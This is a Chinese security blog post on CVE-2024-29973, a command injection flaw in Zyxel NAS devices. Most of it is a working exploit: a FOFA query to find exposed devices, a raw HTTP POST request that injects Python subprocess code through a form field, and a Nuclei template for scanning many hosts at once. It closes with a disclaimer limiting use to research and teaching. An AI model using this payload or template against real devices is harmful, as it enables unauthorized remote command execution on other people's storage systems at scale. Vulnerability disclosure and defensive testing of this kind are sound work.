#  CVE-2024-29973 Zyxel-NAS设备存在远程命令执行漏洞   
原创 Swimt  星悦安全   2024-06-23 14:34  
  
**漏洞简介**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
    合勤科技（ZyXEL）是国际知名的网络宽带系统及解决方案供应商。2024年6月4日，启明星辰集团VSRC监测到Zyxel NAS设备中修复了多个漏洞，目前这些漏洞的技术细节及部分PoC已公开  
  
  
**资产详情**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
```
FoFa:body="/cmd,/ck6fup6/user_grp_cgi/cgi_modify_userinfo"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5fsaGtnOmerUeEKAe27ahlumXUf98zjXrV2q9Pn8p4f0pAm0JPQIsH8R9DHV6kHsdVj0XTj9VSuLA/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5fsaGtnOmerUeEKAe27ahluyhYNB2YXgicHicsjN8OxliaeIvHF13mpSdvyc3NFYm5xavhysWCZgqXeg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
**漏洞复现**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
```
POST /cmd,/simZysh/register_main/setCookie HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHHaZAYecVOf5sfa6
 
------WebKitFormBoundaryHHaZAYecVOf5sfa6
Content-Disposition: form-data; name="c0"
 
storage_ext_cgi CGIGetExtStoInfo None) and False or __import__("subprocess").check_output("id", shell=True)#
------WebKitFormBoundaryHHaZAYecVOf5sfa6--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5fsaGtnOmerUeEKAe27ahluGXazrVyibWxTZD4EcJXs5WG5zibIynXOc0MJhhMRROFpkIjdW6hbibRgg/640?wx_fmt=png&from=appmsg "")  
- Nuclei 批量检测POC  
  
- 所用方法nuclei.exe -l 网址文件.txt -t POC.yaml  
  
```
id: Zyxel-NAS_setCookie_RCE

info:
  name: Zyxel-NAS_setCookie_RCE
  author: security-xm
  severity: high
  description: Zyxel-NAS设备 setCookie 远程命令执行漏洞 (CVE-2024-29973)
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true

http:
- raw:
  - |+
    @timeout: 30s
    POST /cmd,/simZysh/register_main/setCookie HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHHaZAYecVOf5sfa6
    Content-Length: 240

    ------WebKitFormBoundaryHHaZAYecVOf5sfa6
    Content-Disposition: form-data; name="c0"
    
    storage_ext_cgi CGIGetExtStoInfo None) and False or __import__("subprocess").check_output("id", shell=True)#
    ------WebKitFormBoundaryHHaZAYecVOf5sfa6--

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
        - uid
```  
  
**大家多多关注公众号，一直更新优质文章哟**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
**免责声明**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/HVNK6rZ71oofHnCicjcYq2y5pSeBUgibJg8K4djZgn6iaWb6NGmqxIhX2oPlRmGe6Yk0xBODwnibFF8XCjxhEV3K7w/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
    **文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
